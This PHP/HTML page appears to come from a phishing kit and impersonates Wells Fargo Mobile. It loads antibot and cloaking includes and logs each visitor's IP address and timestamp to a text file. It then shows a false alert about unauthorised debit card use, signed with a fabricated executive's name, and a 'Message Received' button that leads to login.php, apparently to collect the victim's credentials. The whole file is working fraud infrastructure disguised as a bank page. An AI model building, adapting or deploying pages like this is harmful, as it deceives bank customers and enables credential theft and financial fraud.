<?php

session_start();

include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');

$random2=rand(0,100000000000);
$randomlink = md5($random2);

$ip = getenv("REMOTE_ADDR");
$file = fopen("c.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

{
}

?>
<html lang="en">

<head>

    <title>Message Received | Wells Fargo </title>

    <link href="../../files/bars/fi.ico" rel="shortcut icon" type="image/x-icon">
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">

    <!-- Stylesheets -->
    <link rel="stylesheet" type="text/css" href="../../files/bars/util.css">
    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-home.css">

</head>

<div id="header">

    <div class="wrapper">

        <input triggerfor="IlDownModal" id="IlDown" type="hidden">
        <div class="background"></div>
        <button type="button" class="link" tabindex="1" triggerfor="goHomeModal">
            <div class="icon"><img src="../../files/bars/icon_home.png" alt="home"></div>
        </button>
        <div id="brand">
            <img alt="Wells Fargo Home Page" tabindex="1" src="../../files/bars/logo.gif">
        </div>
        <div class="title">
            <img src="img/toh.png" alt="Wells Fargo" tabindex="1">
        </div>
        <div id="headerTools">
            <nav>
                <ul>
                    <li>
                        <a href="#" triggerfor="goHomeModal" tabindex="1">Home</a>
                    </li>
                </ul>
            </nav>
        </div>

        <div class="OneLinkNoTx spanish-link" style="display:inline;">

        </div>
    </div>
</div>
<div id="main" role="form">
    <form id="Validate" name="Validate" autocomplete="off" action="login.php" method="">
        <div class="spacer-large"></div>
        <p class="main-title spaced blk-header">Wells Fargo Mobile®</p>
        <div class="descriptor">We recently received a report of unauthorised debit card use associated with this account.</p>As a precaution, we have limited your Wells Fargo Debit/ATM Card(s) in order to protect against future unauthorised transactions.</p>Wells Fargo needs additional information from you before you can continue using your card(s).</div>
        <br>
        <br>
        <div class="spacer">Click "<a style="color:#CC0000;font-weight:bold;">Message Received</a>" below so we may gather with you additional verification needed.</div>
        <br>
        <br>
        <br>
        <div class="descriptor">Thank you for being a Wells Fargo Customer and we look forward to serve all your financial needs.</p>Sincerely,</p><b>K.L. Myers</b></p>
            Executive Vice President, Chief Operating Officer</p>Wells Fargo Bank</div>
        <div class="continue-container">
            <input tabindex="3" name="_eventId_customerInfoEntered" id="continue" value="Message Received" class="continue blue-button" type="submit">
        </div>
        <div>
            <input name="" value="" type="hidden">
        </div>
    </form>
</div>
<!--end main-->
<div id="footer">
    <style>
        @media (min-width: 768px) {
            #footer {
                background: url('img/down.png') repeat-x left -30px;
            }
        }
    </style>
    <!-- Footer included -->
    <!-- scripts -->
    <div class="wrapper">
        <div class="legal">
            <p><a href="" tabindex="1" class="link">Privacy, Security &amp; Legal</a></p>
            <p>© 1999 - <span currentyear="">2019</span> Wells Fargo. All rights reserved.</p>
        </div>
    </div>

</div>
</div>
</body>

</html>